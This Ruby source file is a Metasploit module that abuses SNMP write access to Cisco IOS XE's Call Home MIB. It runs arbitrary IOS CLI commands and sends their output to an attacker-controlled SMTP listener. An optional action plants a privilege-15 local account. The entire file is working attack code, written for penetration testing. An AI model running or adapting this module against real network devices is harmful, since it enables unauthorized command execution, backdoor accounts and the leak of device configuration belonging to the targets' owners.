##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'ipaddr'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::SNMPClient
  include Msf::Exploit::Retry
  include Msf::Auxiliary::Report
  prepend Msf::Exploit::Remote::AutoCheck

  SYS_DESCR_OID = '1.3.6.1.2.1.1.1.0'
  CALLHOME_ENABLE_OID = '1.3.6.1.4.1.9.9.300.1.1.1.0'
  EMAIL_FROM_OID = '1.3.6.1.4.1.9.9.300.1.1.15.0'
  SMTP_SERVER_TABLE_OID = '1.3.6.1.4.1.9.9.300.1.1.22.1'
  SMTP_PORT_OID = "#{SMTP_SERVER_TABLE_OID}.3"
  SMTP_STATUS_OID = "#{SMTP_SERVER_TABLE_OID}.4"
  SMTP_CHECK_INITIATE_OID = '1.3.6.1.4.1.9.9.300.1.3.2.0'
  SMTP_CHECK_RESULT_OID = '1.3.6.1.4.1.9.9.300.1.3.3.0'
  SMTP_AVAILABILITY_OID = '1.3.6.1.4.1.9.9.300.1.3.4.1.1'
  ON_DEMAND_AVAILABLE_OID = '1.3.6.1.4.1.9.9.300.1.3.5.0'
  ON_DEMAND_CLI_OID = '1.3.6.1.4.1.9.9.300.1.4.2'
  CLI_COMMAND_OID = "#{ON_DEMAND_CLI_OID}.1.0"
  CLI_TRANSPORT_OID = "#{ON_DEMAND_CLI_OID}.2.0"
  CLI_EMAIL_OID = "#{ON_DEMAND_CLI_OID}.3.0"
  CLI_FORMAT_OID = "#{ON_DEMAND_CLI_OID}.4.0"
  CLI_REQUEST_ID_OID = "#{ON_DEMAND_CLI_OID}.5.0"
  CLI_TRIGGER_OID = "#{ON_DEMAND_CLI_OID}.6.0"
  AAA_ENABLE_OID = '1.3.6.1.4.1.9.9.300.1.13.1.0'
  SMTP_PORT = 25
  SMTP_CHECK_TIMEOUT = 30
  CLI_COMMAND_MAX_BYTES = 127
  SMTP_MESSAGE_MAX_BYTES = 10 * 1024 * 1024

  # SNMP textual conventions and CISCO-CALLHOME-MIB enumerations.
  TRUTH_VALUE_TRUE = 1
  TRUTH_VALUE_FALSE = 2
  ROW_STATUS_ACTIVE = 1
  ROW_STATUS_CREATE_AND_GO = 4
  ROW_STATUS_DESTROY = 6
  INET_ADDRESS_TYPE_IPV4 = 1
  SMTP_CHECK_SUCCESSFUL = 2
  SMTP_CHECK_FAILED = 4
  SMTP_CHECK_NO_SERVER_CONFIGURED = 5
  SMTP_AVAILABILITY_AVAILABLE = 1
  CLI_TRANSPORT_EMAIL = 1
  CLI_FORMAT_FULL_TEXT = 2

  CONTROL_OIDS = {
    email_from: EMAIL_FROM_OID,
    command: CLI_COMMAND_OID,
    transport: CLI_TRANSPORT_OID,
    email: CLI_EMAIL_OID,
    format: CLI_FORMAT_OID,
    request_id: CLI_REQUEST_ID_OID,
    trigger: CLI_TRIGGER_OID
  }

  INTEGER_CONTROLS = %i[transport format trigger]

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Cisco IOS XE SNMP Call Home CLI Command Execution',
        'Description' => %q{
          This module uses valid SNMP write access to CISCO-CALLHOME-MIB on
          Cisco IOS XE. It stages an on-demand CLI command list, triggers its
          execution, and receives the command output through a temporary SMTP
          server row. The default action executes an operator-supplied IOS CLI
          command list. A second action creates a privilege 15 local account.

          The configured IOS CLI commands execute with the authority assigned
          to Call Home. When Call Home AAA authorization is disabled, testing
          has observed privilege level 15 even while global Call Home is
          disabled. The module restores its Call Home control objects and
          removes its temporary SMTP row. It does not reverse effects caused by
          the supplied CLI commands.
        },
        'Author' => [
          'Deral Heiland'
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://github.com/cisco/cisco-mibs/blob/main/v2/CISCO-CALLHOME-MIB.my']
        ],
        'DefaultOptions' => {
          'TIMEOUT' => 5,
          'RETRIES' => 3
        },
        'Notes' => {
          'Stability' => [SERVICE_RESOURCE_LOSS],
          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES],
          'Reliability' => [EVENT_DEPENDENT]
        }
      )
    )

    deregister_options(
      'COMMUNITY', 'VERSION'
    )
    register_options(
      [
        OptString.new('COMMUNITY', [false, 'SNMPv1/v2c read-write community string', 'private']),
        OptEnum.new('VERSION', [true, 'SNMP version', '2c', ['1', '2c', '3']]),
        OptEnum.new('ACTION', [true, 'Call Home CLI operation', 'EXECUTE', ['EXECUTE', 'CREATE_ACCOUNT']]),
        OptString.new('CMD', [true, 'Semicolon-delimited IOS CLI commands for the EXECUTE action', 'show privilege'], conditions: %w[ACTION == EXECUTE]),
        OptString.new('USERNAME', [false, 'Privilege 15 account username'], conditions: %w[ACTION == CREATE_ACCOUNT]),
        OptString.new('PASSWORD', [false, 'Privilege 15 account password'], conditions: %w[ACTION == CREATE_ACCOUNT]),
        OptAddressLocal.new('SRVHOST', [true, 'Local IPv4 address on which to receive SMTP', '0.0.0.0']),
        OptAddress.new('LHOST', [true, 'SMTP address advertised to IOS XE']),
        OptInt.new('READY_TIMEOUT', [true, 'Seconds to wait for the on-demand Call Home service to become ready', 600]),
        OptInt.new('CALLBACK_TIMEOUT', [true, 'Seconds to wait for the Call Home SMTP message', 180]),
        OptBool.new('ALLOW_EXISTING_SMTP', [true, 'Continue when other Call Home SMTP rows may receive command text and output', false])
      ]
    )
  end

  def validate
    super
    errors = {}
    if datastore['VERSION'] == '3'
      errors['SNMPV3::USERNAME'] = 'SNMPV3::USERNAME must be set when VERSION is 3' if datastore['SNMPV3::USERNAME'].blank?
      if datastore['SNMPV3::SECURITY_LEVEL'] != 'noAuthNoPriv' && datastore['SNMPV3::AUTH_PASSWORD'].blank?
        errors['SNMPV3::AUTH_PASSWORD'] = 'SNMPV3::AUTH_PASSWORD must be set when authentication is enabled'
      end
      if datastore['SNMPV3::SECURITY_LEVEL'] == 'authPriv' && datastore['SNMPV3::PRIV_PASSWORD'].blank?
        errors['SNMPV3::PRIV_PASSWORD'] = 'SNMPV3::PRIV_PASSWORD must be set when privacy is enabled'
      end
    elsif datastore['COMMUNITY'].blank?
      errors['COMMUNITY'] = 'COMMUNITY must be set when VERSION is 1 or 2c'
    end
    errors['READY_TIMEOUT'] = 'READY_TIMEOUT must be greater than zero' unless datastore['READY_TIMEOUT'].positive?
    errors['CALLBACK_TIMEOUT'] = 'CALLBACK_TIMEOUT must be greater than zero' unless datastore['CALLBACK_TIMEOUT'].positive?
    if datastore['ACTION'] == 'CREATE_ACCOUNT'
      errors['USERNAME'] = 'USERNAME must be set for CREATE_ACCOUNT' if datastore['USERNAME'].blank?
      errors['PASSWORD'] = 'PASSWORD must be set for CREATE_ACCOUNT' if datastore['PASSWORD'].blank?
      if datastore['USERNAME'].present? && !datastore['USERNAME'].match?(/\A[a-zA-Z0-9_.-]+\z/)
        errors['USERNAME'] = 'USERNAME may contain only letters, digits, underscore, dash, and dot'
      end
      if datastore['PASSWORD'].present? && datastore['PASSWORD'].match?(/[\s;'"\x00-\x1f]/)
        errors['PASSWORD'] = 'PASSWORD cannot contain whitespace, semicolon, quote, or control characters'
      end
    end

    command = command_list
    if command.blank?
      errors[datastore['ACTION'] == 'CREATE_ACCOUNT' ? 'USERNAME' : 'CMD'] = 'At least one IOS CLI command is required'
    elsif command.bytesize > CLI_COMMAND_MAX_BYTES
      errors[datastore['ACTION'] == 'CREATE_ACCOUNT' ? 'USERNAME' : 'CMD'] = "Generated command list is #{command.bytesize} bytes; maximum is #{CLI_COMMAND_MAX_BYTES}"
    elsif command.match?(/[\r\n\x00]/)
      errors['CMD'] = 'CMD cannot contain CR, LF, or NUL characters'
    end
    raise Msf::OptionValidateError, errors unless errors.empty?
  end

  def check
    connect_snmp
    description = read_oid(SYS_DESCR_OID)
    command = read_oid(CLI_COMMAND_OID)
    available = read_oid(ON_DEMAND_AVAILABLE_OID)
    trigger = read_oid(CLI_TRIGGER_OID)
    return Exploit::CheckCode::Safe('CISCO-CALLHOME-MIB on-demand CLI objects are unavailable') if [description, command, available, trigger].any? { |value| exception_value?(value) }
    unless available.to_i == TRUTH_VALUE_TRUE && trigger.to_i == TRUTH_VALUE_FALSE
      return Exploit::CheckCode::Detected("CISCO-CALLHOME-MIB on-demand CLI objects are present, but the serialized service is busy; run will wait up to #{datastore['READY_TIMEOUT']} seconds")
    end

    report_service(host: rhost, port: rport, proto: 'udp', name: 'snmp', info: description.to_s)

    cli_result = reversible_cli_control_writable?(command)
    return Exploit::CheckCode::Unknown('The Call Home CLI control could not be restored; no further writable checks were attempted') if cli_result == :restoration_failed
    return Exploit::CheckCode::Safe('The on-demand Call Home CLI control is not writable') unless cli_result == :writable

    begin
      callback_host = IPAddr.new(datastore['LHOST'])
    rescue IPAddr::InvalidAddressError, IPAddr::AddressFamilyError
      return Exploit::CheckCode::Unknown('LHOST must be set to an IPv4 address for writable SMTP-row validation')
    end
    return Exploit::CheckCode::Unknown('LHOST must be IPv4 for writable SMTP-row validation') unless callback_host.ipv4?

    @callback_host = callback_host.to_s
    @smtp_address = "msf-check-#{Rex::Text.rand_text_alphanumeric(8).downcase}@example.invalid"
    begin
      start_smtp_receiver
      smtp_result = reversible_smtp_row_writable?(*smtp_row_oids(@callback_host))
    ensure
      stop_smtp_receiver
    end
    return Exploit::CheckCode::Unknown("The SMTP row for #{callback_host} already exists and cannot be safely tested") if smtp_result == :occupied
    return Exploit::CheckCode::Unknown('The temporary SMTP row could not be removed; target state requires manual review') if smtp_result == :restoration_failed
    return Exploit::CheckCode::Unknown('SNMP writes succeeded, but IOS XE could not validate the SMTP callback path without CLI execution') if smtp_result == :unreachable
    return Exploit::CheckCode::Safe('The Call Home SMTP-server row is not writable') unless smtp_result == :writable

    version = description.to_s[/\bVersion\s+(\d+\.\d+(?:\.\d+)?)\b/i, 1]
    version_text = version ? "IOS XE #{version}" : description.to_s.lines.first.to_s.strip
    Exploit::CheckCode::Appears("Reversible writes and the non-CLI SMTP callback test indicate exploitability on #{version_text}; restoration was confirmed")
  rescue ::Rex::ConnectionError, ::SNMP::RequestTimeout => e
    Exploit::CheckCode::Unknown("SNMP connection failed: #{e.message}")
  rescue ::SNMP::UnsupportedVersion, ::SNMP::ParseError, ::SNMP::SecurityError => e
    Exploit::CheckCode::Unknown("SNMP processing failed: #{e.message}")
  rescue StandardError => e
    Exploit::CheckCode::Unknown("Unexpected check failure: #{e.message}")
  ensure
    disconnect_snmp
  end

  def run
    @smtp_row_created = false
    @controls_staged = false
    @restoration_failed = false
    processing_error = {}
    module_failure = nil

    begin
      connect_snmp
      @callback_host = advertised_smtp_host
      @smtp_address = "msf-#{Rex::Text.rand_text_alphanumeric(10).downcase}@example.invalid"
      @request_id = "MSF-#{Rex::Text.rand_text_alphanumeric(12).upcase}"
      prepare_callhome_state
      start_smtp_receiver
      stage_callhome_command
      trigger_callhome_command
      @smtp_message = wait_for_smtp_message
      fail_with(Msf::Module::Failure::TimeoutExpired, "No Call Home SMTP message was received from #{rhost}") unless @smtp_message
      @cli_output = extract_cli_output(@smtp_message)
    rescue ::Rex::ConnectionError, ::SNMP::RequestTimeout => e
      processing_error = { type: :unreachable, message: "SNMP communication failed: #{e.message}" }
    rescue ::SNMP::UnsupportedVersion, ::SNMP::ParseError, ::SNMP::SecurityError => e
      processing_error = { type: :unexpected_reply, message: "SNMP processing failed: #{e.message}" }
    rescue Msf::Auxiliary::Failed => e
      module_failure = e
      processing_error = { type: :module_failure, message: fail_detail || e.message }
    ensure
      restore_callhome_state
      stop_smtp_receiver
      disconnect_snmp
    end

    if @restoration_failed
      message = 'Temporary CISCO-CALLHOME-MIB state was not fully restored; target state requires manual review'
      message << " (original failure: #{processing_error[:message]})" if processing_error[:message]
      fail_with(Msf::Module::Failure::UnexpectedReply, message)
    end
    raise module_failure if module_failure

    fail_with(Msf::Module::Failure::Unreachable, processing_error[:message]) if processing_error[:type] == :unreachable
    fail_with(Msf::Module::Failure::UnexpectedReply, processing_error[:message]) if processing_error[:type] == :unexpected_reply

    save_and_display_output
  end

  def prepare_callhome_state
    wait_until_ready
    @original_controls = read_controls
    fail_with(Msf::Module::Failure::UnexpectedReply, 'One or more Call Home control objects are unavailable') if @original_controls.values.any? { |value| exception_value?(value) }

    @smtp_status_oid, @smtp_port_oid = smtp_row_oids(@callback_host)
    selected_status = read_oid(@smtp_status_oid)
    fail_with(Msf::Module::Failure::BadConfig, "The SMTP row for #{@callback_host} already exists; refusing to overwrite it") unless exception_value?(selected_status)

    existing_rows = smtp_rows
    if existing_rows.any?
      print_warning("Found #{existing_rows.length} existing Call Home SMTP row(s)")
      fail_with(Msf::Module::Failure::BadConfig, 'Existing SMTP rows could receive command text and output; set ALLOW_EXISTING_SMTP true to continue') unless datastore['ALLOW_EXISTING_SMTP']
    end

    callhome_enabled = read_oid(CALLHOME_ENABLE_OID)
    aaa_enabled = read_oid(AAA_ENABLE_OID)
    print_status("Global Call Home is #{callhome_enabled.to_i == TRUTH_VALUE_TRUE ? 'enabled' : 'disabled'}") unless exception_value?(callhome_enabled)
    print_warning('Call Home AAA authorization is enabled; CLI authority depends on its configured identity') if !exception_value?(aaa_enabled) && aaa_enabled.to_i == TRUTH_VALUE_TRUE
  end

  def stage_callhome_command
    @smtp_row_created = true
    set_varbinds('Create temporary SMTP row', [integer_varbind(@smtp_status_oid, ROW_STATUS_CREATE_AND_GO)])
    unless read_oid(@smtp_status_oid).to_i == ROW_STATUS_ACTIVE && read_oid(@smtp_port_oid).to_i == SMTP_PORT
      fail_with(Msf::Module::Failure::UnexpectedReply, 'Temporary SMTP row did not become active on port 25')
    end
    verify_smtp_server

    staged_controls = {
      email_from: @smtp_address,
      command: command_list,
      transport: CLI_TRANSPORT_EMAIL,
      email: @smtp_address,
      format: CLI_FORMAT_FULL_TEXT,
      request_id: @request_id
    }
    @controls_staged = true
    set_varbinds('Stage Call Home CLI controls', control_varbinds(staged_controls))
    readback = read_controls
    staged_controls.each do |name, expected|
      actual = readback[name]
      matches = INTEGER_CONTROLS.include?(name) ? actual.to_i == expected : actual.to_s == expected
      fail_with(Msf::Module::Failure::UnexpectedReply, "Call Home #{name} readback validation failed") unless matches
    end
  end

  def verify_smtp_server(fatal: true)
    availability_oid = smtp_availability_oid(@callback_host)
    initiated = set_varbinds('Check temporary SMTP server availability', [integer_varbind(SMTP_CHECK_INITIATE_OID, TRUTH_VALUE_TRUE)], fatal: fatal)
    return false unless initiated

    deadline = Process.clock_gettime(Process::CLOCK_MONOTONIC) + SMTP_CHECK_TIMEOUT
    loop do
      result = read_oid(SMTP_CHECK_RESULT_OID)
      availability = read_oid(availability_oid)
      if !exception_value?(result) && !exception_value?(availability) && result.to_i == SMTP_CHECK_SUCCESSFUL && availability.to_i == SMTP_AVAILABILITY_AVAILABLE
        print_good('IOS XE verified the temporary SMTP server without CLI execution')
        return true
      end

      if !exception_value?(result) && [SMTP_CHECK_FAILED, SMTP_CHECK_NO_SERVER_CONFIGURED].include?(result.to_i)
        return false unless fatal

        fail_with(Msf::Module::Failure::Unreachable, 'IOS XE could not reach the temporary SMTP server')
      end

      remaining = deadline - Process.clock_gettime(Process::CLOCK_MONOTONIC)
      unless remaining.positive?
        return false unless fatal

        fail_with(Msf::Module::Failure::TimeoutExpired, 'IOS XE did not complete the temporary SMTP server check')
      end

      sleep([remaining, 1].min)
    end
  end

  def trigger_callhome_command
    set_varbinds('Trigger Call Home CLI execution', [integer_varbind(CLI_TRIGGER_OID, TRUTH_VALUE_TRUE)])
    trigger = read_oid(CLI_TRIGGER_OID)
    fail_with(Msf::Module::Failure::UnexpectedReply, 'Call Home trigger did not return to false') if exception_value?(trigger) || trigger.to_i != TRUTH_VALUE_FALSE
    print_status("Waiting up to #{datastore['CALLBACK_TIMEOUT']} seconds for CLI output")
  end

  def start_smtp_receiver
    @smtp_queue = Queue.new
    @smtp_server = Rex::Socket::TcpServer.create(
      'LocalHost' => srvhost,
      'LocalPort' => SMTP_PORT,
      'Context' => {
        'Msf' => framework,
        'MsfExploit' => self
      }
    )
    add_socket(@smtp_server)
    print_status("SMTP receiver listening on #{Rex::Socket.to_authority(srvhost, SMTP_PORT)}; advertising #{Rex::Socket.to_authority(@callback_host, SMTP_PORT)}")
    @smtp_thread = framework.threads.spawn('Cisco Call Home SMTP receiver', false) do
      receive_matching_smtp_message
    rescue StandardError => e
      @smtp_queue << { error: e }
    end
  rescue StandardError => e
    fail_with(Msf::Module::Failure::BadConfig, "Unable to start the SMTP receiver: #{e.message}")
  end

  def receive_matching_smtp_message
    deadline = Process.clock_gettime(Process::CLOCK_MONOTONIC) + datastore['CALLBACK_TIMEOUT']
    while (remaining = deadline - Process.clock_gettime(Process::CLOCK_MONOTONIC)).positive?
      ready = ::IO.select([@smtp_server], nil, nil, remaining)
      break unless ready

      client = @smtp_server.accept
      add_socket(client)
      begin
        message = receive_smtp_message(client, deadline)
        if message&.include?(@smtp_address)
          @smtp_queue << { message: message, peer: client.peerhost }
          return
        end
        vprint_warning('Discarded an SMTP message that did not contain the per-run recipient marker') if message
      ensure
        client.close
      end
    end
    @smtp_queue << {}
  end

  def receive_smtp_message(client, deadline)
    client.put("220 Metasploit Call Home SMTP receiver ready\r\n")
    buffer = ''.b
    message = ''.b
    completed_message = nil
    in_data = false

    while (remaining = deadline - Process.clock_gettime(Process::CLOCK_MONOTONIC)).positive?
      ready = ::IO.select([client], nil, nil, [remaining, completed_message ? 1 : 5].min)
      break if !ready && completed_message
      next unless ready

      chunk = client.recv(65_535)
      break if chunk.nil? || chunk.empty?

      buffer << chunk
      fail_with(Msf::Module::Failure::UnexpectedReply, 'SMTP message exceeded the maximum accepted size') if buffer.bytesize + message.bytesize > SMTP_MESSAGE_MAX_BYTES
      while (newline = buffer.index("\n"))
        line = buffer.slice!(0..newline).sub(/\r?\n\z/, '')
        if in_data
          if line == '.'
            client.put("250 Message accepted\r\n")
            completed_message = message
            in_data = false
            next
          end
          line = line[1..] if line.start_with?('..')
          message << line << "\r\n"
          next
        end

        command = line.split(' ', 2).first.to_s.upcase
        case command
        when 'EHLO', 'HELO'
          client.put("250 Metasploit\r\n")
        when 'MAIL', 'RCPT', 'RSET', 'NOOP'
          client.put("250 OK\r\n")
        when 'DATA'
          client.put("354 End data with <CR><LF>.<CR><LF>\r\n")
          in_data = true
        when 'QUIT'
          client.put("221 Bye\r\n")
          return completed_message
        else
          client.put("250 OK\r\n")
        end
      end
    end
    completed_message
  end

  def wait_for_smtp_message
    result = poll_until_truthy(timeout: datastore['CALLBACK_TIMEOUT'] + 5) do
      @smtp_queue.pop(true)
    rescue ThreadError
      nil
    end
    return unless result

    fail_with(Msf::Module::Failure::UnexpectedReply, "SMTP receiver failed: #{result[:error].message}") if result[:error]
    print_good("Received Call Home SMTP message from #{result[:peer]}") if result[:message]
    result[:message]
  end

  def stop_smtp_receiver
    @smtp_server&.close
  rescue IOError, SystemCallError => e
    vprint_warning("SMTP receiver cleanup failed: #{e.message}")
  ensure
    @smtp_server = nil
    @smtp_thread&.kill
    @smtp_thread = nil
  end

  def restore_callhome_state
    restored = true
    if @controls_staged
      restored &&= set_varbinds('Restore Call Home CLI controls', control_varbinds(@original_controls.except(:trigger)), fatal: false)
      readback = read_controls
      restored &&= @original_controls.all? do |name, expected|
        actual = readback[name]
        INTEGER_CONTROLS.include?(name) ? actual.to_i == expected.to_i : actual.to_s == expected.to_s
      end
    end
    if @smtp_row_created
      row_destroyed = set_varbinds('Destroy temporary SMTP row', [integer_varbind(@smtp_status_oid, ROW_STATUS_DESTROY)], fatal: false)
      row_absent = exception_value?(read_oid(@smtp_status_oid))
      restored = restored && row_destroyed && row_absent
    end
    @restoration_failed = !restored
    print_good('Temporary CISCO-CALLHOME-MIB state restored') if restored && (@controls_staged || @smtp_row_created)
  rescue StandardError => e
    @restoration_failed = true
    print_error("Temporary CISCO-CALLHOME-MIB restoration failed: #{e.message}")
  end

  def wait_until_ready
    deadline = Process.clock_gettime(Process::CLOCK_MONOTONIC) + datastore['READY_TIMEOUT']
    loop do
      available = read_oid(ON_DEMAND_AVAILABLE_OID)
      return if !exception_value?(available) && available.to_i == TRUTH_VALUE_TRUE

      remaining = deadline - Process.clock_gettime(Process::CLOCK_MONOTONIC)
      fail_with(Msf::Module::Failure::TimeoutExpired, 'The on-demand Call Home service did not become ready') unless remaining.positive?
      vprint_status("Waiting for the on-demand Call Home service: #{remaining.ceil}s remain")
      sleep([remaining, 5].min)
    end
  end

  def command_list
    return datastore['CMD'].to_s.split(';').map(&:strip).reject(&:empty?).join(';') if datastore['ACTION'] == 'EXECUTE'

    commands = [
      'configure terminal',
      "username #{datastore['USERNAME']} privilege 15 secret 0 #{datastore['PASSWORD']}",
      'end',
      "show run | i ^username #{datastore['USERNAME']}"
    ]
    commands.join(';')
  end

  def save_and_display_output
    request_filename = "#{rhost}_#{@request_id}"
    command_label = loot_command_label
    output_path = store_loot('cisco.ios_xe.cli_output', 'text/plain', rhost, @cli_output, "#{request_filename}.txt", "IOS CLI output for: #{command_label}")
    print_good("Saved IOS CLI output to #{output_path}")
    print_good('IOS CLI output:')
    @cli_output.each_line { |line| print_line(line.chomp) }

    return unless datastore['ACTION'] == 'CREATE_ACCOUNT'

    if @cli_output.match?(/^username\s+#{Regexp.escape(datastore['USERNAME'])}\s+privilege\s+15\s+/i)
      print_good("Created privilege 15 account #{datastore['USERNAME']}:#{datastore['PASSWORD']}")
    else
      print_warning("The SMTP message was received, but account #{datastore['USERNAME']} was not found in captured running configuration output")
    end
  end

  def loot_command_label
    label = command_list
    label = label.sub(datastore['PASSWORD']) { '[REDACTED]' } if datastore['ACTION'] == 'CREATE_ACCOUNT'
    label
  end

  def extract_cli_output(message)
    blocks = message.scan(/^Command Output Name\s*:\s*(.*?)\r?\n.*?^Command Output Text\s*:\s*(.*?)(?=^Command Output Name\s*:|\z)/mi)
    return message.split(/\r?\n\r?\n/, 2).last.to_s if blocks.empty?

    blocks.map do |name, output|
      command = name.strip
      command_output = output.rstrip.sub(/\A#{Regexp.escape(command)}\r?\n/, '')
      "$ #{command}\n#{command_output}"
    end.join("\n\n")
  end

  def advertised_smtp_host
    host = datastore['LHOST']
    begin
      address = IPAddr.new(host)
    rescue IPAddr::InvalidAddressError
      fail_with(Msf::Module::Failure::BadConfig, "Unable to resolve an SMTP callback address from #{host}")
    end
    fail_with(Msf::Module::Failure::BadConfig, 'The tested Call Home SMTP row implementation requires an IPv4 callback address') unless address.ipv4?

    address.to_s
  end

  def smtp_row_oids(address)
    address_octets = IPAddr.new(address).hton.bytes
    suffix = "#{INET_ADDRESS_TYPE_IPV4}.#{address_octets.length}.#{address_octets.join('.')}"
    ["#{SMTP_STATUS_OID}.#{suffix}", "#{SMTP_PORT_OID}.#{suffix}"]
  end

  def smtp_availability_oid(address)
    address_octets = IPAddr.new(address).hton.bytes
    suffix = "#{INET_ADDRESS_TYPE_IPV4}.#{address_octets.length}.#{address_octets.join('.')}"
    "#{SMTP_AVAILABILITY_OID}.#{suffix}"
  end

  def smtp_rows
    rows = []
    snmp.walk(SMTP_STATUS_OID) do |varbind|
      rows << varbind.name.to_s unless exception_value?(varbind.value)
    end
    rows
  end

  def reversible_cli_control_writable?(original)
    canary = original.to_s == 'show clock' ? 'show privilege' : 'show clock'
    attempted = false
    writable = false
    restored = false
    begin
      attempted = true
      writable = set_varbinds('Check CLI-control write', [string_varbind(CLI_COMMAND_OID, canary)], fatal: false)
      writable &&= read_oid(CLI_COMMAND_OID).to_s == canary
    rescue ::Rex::ConnectionError, ::SNMP::RequestTimeout, ::SNMP::ParseError, ::SNMP::SecurityError => e
      vprint_warning("CLI-control writable check failed: #{e.message}")
    ensure
      if attempted
        begin
          set_varbinds('Check CLI-control restore', [string_varbind(CLI_COMMAND_OID, original)], fatal: false)
          restored = read_oid(CLI_COMMAND_OID).to_s == original.to_s
        rescue ::Rex::ConnectionError, ::SNMP::RequestTimeout, ::SNMP::ParseError, ::SNMP::SecurityError => e
          vprint_warning("CLI-control restoration failed: #{e.message}")
        end
      end
    end
    return :restoration_failed unless restored

    writable ? :writable : :not_writable
  end

  def reversible_smtp_row_writable?(status_oid, port_oid)
    return :occupied unless exception_value?(read_oid(status_oid))

    attempted = false
    writable = false
    restored = false
    begin
      attempted = true
      writable = set_varbinds('Check SMTP-row createAndGo', [integer_varbind(status_oid, ROW_STATUS_CREATE_AND_GO)], fatal: false)
      writable &&= read_oid(status_oid).to_i == ROW_STATUS_ACTIVE
      writable &&= read_oid(port_oid).to_i == SMTP_PORT
      reachable = verify_smtp_server(fatal: false) if writable
    rescue ::Rex::ConnectionError, ::SNMP::RequestTimeout, ::SNMP::ParseError, ::SNMP::SecurityError => e
      vprint_warning("SMTP-row writable check failed: #{e.message}")
    ensure
      if attempted
        begin
          set_varbinds('Check SMTP-row destroy', [integer_varbind(status_oid, ROW_STATUS_DESTROY)], fatal: false)
          restored = exception_value?(read_oid(status_oid))
        rescue ::Rex::ConnectionError, ::SNMP::RequestTimeout, ::SNMP::ParseError, ::SNMP::SecurityError => e
          vprint_warning("SMTP-row restoration failed: #{e.message}")
        end
      end
    end
    return :restoration_failed unless restored
    return :unreachable if writable && !reachable

    writable ? :writable : :not_writable
  end

  def read_controls
    CONTROL_OIDS.transform_values { |oid| read_oid(oid) }
  end

  def control_varbinds(values)
    values.map do |name, value|
      oid = CONTROL_OIDS.fetch(name)
      INTEGER_CONTROLS.include?(name) ? integer_varbind(oid, value) : string_varbind(oid, value)
    end
  end

  def read_oid(oid)
    response = snmp.get(oid)
    return SNMP::NoSuchInstance if response.error_status == :noSuchName
    raise SNMP::ParseError, "SNMP GET #{oid} returned #{response.error_status}" unless response.error_status == :noError

    value = response.vb_list.first.value
    type = value.respond_to?(:asn1_type) ? value.asn1_type : value.class.name
    vprint_status("GET #{oid} #{type}=#{value}")
    value
  end

  def exception_value?(value)
    [SNMP::NoSuchObject, SNMP::NoSuchInstance, SNMP::EndOfMibView].any? { |type| value.equal?(type) || value.is_a?(type) }
  end

  def set_varbinds(operation, varbinds, fatal: true)
    print_status("#{operation}: sending SNMP SET with #{varbinds.length} varbinds")
    response = snmp.set(varbinds)
    return true if response.error_status == :noError

    message = "#{operation} returned #{response.error_status} at varbind #{response.error_index}"
    fail_with(Msf::Module::Failure::UnexpectedReply, message) if fatal
    print_error(message)
    false
  end

  def integer_varbind(oid, value)
    SNMP::VarBind.new(oid, SNMP::Integer.new(value))
  end

  def string_varbind(oid, value)
    SNMP::VarBind.new(oid, SNMP::OctetString.new(value.to_s))
  end

  def srvhost
    datastore['SRVHOST'] # rubocop:disable Lint/DatastoreSrvhostUsage
  end
end
